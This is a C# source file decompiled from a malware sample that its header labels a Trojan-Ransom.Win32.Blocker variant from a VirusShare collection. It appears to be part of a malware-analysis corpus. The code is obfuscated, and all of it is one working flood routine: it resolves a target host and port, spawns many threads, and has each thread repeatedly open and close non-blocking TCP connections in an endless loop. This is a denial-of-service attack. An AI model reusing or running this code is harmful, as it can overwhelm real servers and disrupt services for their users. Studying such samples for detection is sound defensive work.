// Decompiled with JetBrains decompiler
// Type: .
// Assembly: N0ise, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2EAA04FB-4A12-46FB-89C9-8F20DEF80030
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.Blocker.heqk-a676fa6fd1e5c420949ebe87d886c57cc8693a1c182562bacd2c8a70cf0dc574.exe

using \u0005;
using System;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;

namespace \u0005
{
  internal class \u0017
  {
    private static ThreadStart[] \u0001;
    private static Thread[] \u0002;
    public static string \u0003;
    private static IPEndPoint \u0004;
    public static ushort \u0005;
    private static \u0017.\u0018[] \u0006;
    public static int \u0007;
    public static int \u0008;

    public static void \u0098()
    {
      try
      {
        \u0017.\u0004 = new IPEndPoint(Dns.GetHostEntry(\u0017.\u0003).AddressList[0], (int) \u0017.\u0005);
      }
      catch
      {
        \u0017.\u0004 = new IPEndPoint(IPAddress.Parse(\u0017.\u0003), (int) \u0017.\u0005);
      }
      \u0017.\u0002 = new Thread[\u0017.\u0008];
      \u0017.\u0001 = new ThreadStart[\u0017.\u0008];
      \u0017.\u0006 = new \u0017.\u0018[\u0017.\u0008];
      for (int index = 0; index < \u0017.\u0008; ++index)
      {
        \u0017.\u0006[index] = new \u0017.\u0018(\u0017.\u0004, \u0017.\u0007);
        \u0017.\u0001[index] = new ThreadStart(\u0017.\u0006[index].\u008C);
        \u0017.\u0002[index] = new Thread(\u0017.\u0001[index]);
        \u0017.\u0002[index].Start();
      }
    }

    public static void \u0099()
    {
      for (int index = 0; index < \u0017.\u0008; ++index)
      {
        try
        {
          \u0017.\u0002[index].Suspend();
        }
        catch
        {
        }
      }
    }

    private class \u0018
    {
      private IPEndPoint \u0001;
      private Socket[] \u0002;
      private int \u0003;

      public \u0018([In] IPEndPoint obj0, [In] int obj1)
      {
        this.\u0001 = obj0;
        this.\u0003 = obj1;
      }

      private void \u009A([In] IAsyncResult obj0)
      {
      }

      public void \u008C()
      {
label_0:
        try
        {
          while (true)
          {
            this.\u0002 = new Socket[this.\u0003];
            for (int index = 0; index < this.\u0003; ++index)
            {
              this.\u0002[index] = new Socket(this.\u0001.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
              this.\u0002[index].Blocking = false;
              AsyncCallback callback = new AsyncCallback(this.\u009A);
              this.\u0002[index].BeginConnect((EndPoint) this.\u0001, callback, (object) this.\u0002[index]);
            }
            Thread.Sleep(100);
            for (int index = 0; index < this.\u0003; ++index)
            {
              if (this.\u0002[index].Connected)
                this.\u0002[index].Disconnect(false);
              this.\u0002[index].Close();
              this.\u0002[index] = (Socket) null;
            }
            this.\u0002 = (Socket[]) null;
          }
        }
        catch
        {
          for (int index = 0; index < this.\u0003; ++index)
          {
            try
            {
              if (this.\u0002[index].Connected)
                this.\u0002[index].Disconnect(false);
              this.\u0002[index].Close();
              this.\u0002[index] = (Socket) null;
            }
            catch
            {
            }
          }
          goto label_0;
        }
      }
    }
  }
}
